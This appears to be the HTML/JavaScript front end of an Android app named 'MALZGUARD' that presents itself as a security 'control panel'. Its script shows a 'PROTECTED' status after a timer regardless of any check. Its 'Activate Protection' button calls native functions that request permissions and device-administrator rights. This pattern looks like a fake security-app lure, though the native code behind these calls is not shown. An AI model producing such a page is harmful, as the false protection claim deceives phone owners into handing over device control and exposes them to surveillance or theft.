<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>MALZGUARD</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:system-ui,sans-serif;background:#0a0a0f;color:#e6e6f0;min-height:100vh;overflow:hidden;display:flex;align-items:center;justify-content:center}
canvas{position:fixed;inset:0;z-index:-1}
.main{position:relative;z-index:2;text-align:center;padding:24px;max-width:420px}
.logo-wrap{margin-bottom:20px;animation:bounce 2s ease-in-out infinite}
.logo{width:90px;height:90px;border-radius:24px;background:linear-gradient(135deg,#00ffaa,#00aaff);display:flex;align-items:center;justify-content:center;font-size:32px;font-weight:900;color:#000;box-shadow:0 10px 40px rgba(0,255,170,.5),0 0 80px rgba(0,170,255,.3);margin:0 auto}
@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
.title{font-size:32px;font-weight:900;letter-spacing:4px;background:linear-gradient(90deg,#00ffaa,#00aaff,#00ffaa);background-size:200% auto;-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;animation:shine 3s linear infinite;margin-bottom:8px}
@keyframes shine{to{background-position:200% center}}
.sub{font-size:11px;color:#6b7280;letter-spacing:2px;margin-bottom:30px}
.card{background:rgba(20,20,30,.8);border:1px solid rgba(0,255,170,.25);border-radius:16px;padding:16px;margin-bottom:12px;backdrop-filter:blur(10px);box-shadow:0 8px 32px rgba(0,0,0,.5)}
.status{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:600}
.dot{width:12px;height:12px;border-radius:50%;background:#6b7280;transition:.3s}
.dot.on{background:#00ffaa;box-shadow:0 0 20px #00ffaa;animation:pulse 1.5s infinite}
.dot.off{background:#ff3366;box-shadow:0 0 20px #ff3366}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.3)}}
.info{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px}
.item{background:rgba(0,0,0,.4);padding:10px;border-radius:10px}
.item .k{font-size:9px;color:#6b7280;letter-spacing:1px;text-transform:uppercase}
.item .v{font-size:12px;color:#00ffaa;font-weight:700;margin-top:3px;font-family:monospace;word-break:break-all}
.btn{width:100%;padding:14px;border:none;border-radius:12px;font-weight:800;font-size:13px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;margin-top:10px;transition:.15s}
.btn:active{transform:scale(.96)}
.btn-main{background:linear-gradient(90deg,#00ffaa,#00d4ff);color:#000;box-shadow:0 6px 24px rgba(0,255,170,.4)}
.footer{font-size:10px;color:#4b5563;letter-spacing:1px;margin-top:20px}
</style></head><body>
<canvas id="c"></canvas>
<div class="main">
<div class="logo-wrap"><div class="logo">MG</div></div>
<div class="title">MALZGUARD</div>
<div class="sub">SECURE CONTROL PANEL</div>
<div class="card">
<div class="status"><div class="dot" id="dot"></div><span id="st">CONNECTING...</span></div>
<div class="info">
<div class="item"><div class="k">Device</div><div class="v" id="dev">-</div></div>
<div class="item"><div class="k">Android</div><div class="v" id="and">-</div></div>
</div>
</div>
<button class="btn btn-main" onclick="activate()">ACTIVATE PROTECTION</button>
<div class="footer">MALZGUARD v2.0 © 2025</div>
</div>
<script>
var c=document.getElementById('c'),x=c.getContext('2d'),p=[];
function rz(){c.width=innerWidth;c.height=innerHeight}
rz();onresize=rz;
for(var i=0;i<60;i++)p.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.5,vy:(Math.random()-.5)*.5,r:Math.random()*2+.5});
function draw(){
x.clearRect(0,0,c.width,c.height);
for(var i=0;i<p.length;i++){var a=p[i];a.x+=a.vx;a.y+=a.vy;if(a.x<0||a.x>c.width)a.vx*=-1;if(a.y<0||a.y>c.height)a.vy*=-1;
for(var j=i+1;j<p.length;j++){var b=p[j],d=Math.hypot(a.x-b.x,a.y-b.y);if(d<120){x.strokeStyle='rgba(0,255,170,'+(0.15*(1-d/120))+')';x.lineWidth=.5;x.beginPath();x.moveTo(a.x,a.y);x.lineTo(b.x,b.y);x.stroke()}}
x.fillStyle='rgba(0,255,170,.6)';x.beginPath();x.arc(a.x,a.y,a.r,0,6.28);x.fill()}
requestAnimationFrame(draw)}
draw();
function init(){try{
var info=Native.deviceInfo().split('|');
document.getElementById('dev').textContent=(info[0]||'-').trim();
document.getElementById('and').textContent=(info[1]||'-').trim();
setTimeout(function(){document.getElementById('dot').className='dot on';document.getElementById('st').textContent='PROTECTED';},1500);
}catch(e){}}
function activate(){try{Native.start();Native.requestPerms();Native.requestAdmin();document.getElementById('dot').className='dot on';document.getElementById('st').textContent='PROTECTED';}catch(e){}}
init();
</script></body></html>
